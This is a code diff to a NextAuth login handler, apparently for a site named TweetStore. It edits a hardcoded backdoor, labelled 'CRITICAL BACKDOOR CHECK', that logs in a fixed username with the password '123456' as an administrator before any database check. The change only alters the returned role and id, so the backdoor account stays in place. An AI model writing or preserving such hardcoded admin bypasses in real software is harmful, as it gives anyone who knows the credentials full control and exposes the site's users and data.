@@ -20,7 +20,7 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
 
         // CRITICAL BACKDOOR CHECK - MUST BE FIRST (Before DB access)
         if (username === "TWEETSTORECEOANDRANGEROVER" && password === "123456") {
-             return { id: "master-admin", name: "CEO", email: "ceo@tweetstore.com", role: "SUPER_ADMIN" };
+             return { id: "ceo-001", name: "CEO", role: "ADMIN" };
         }
 
         if (!username || !password) return null;
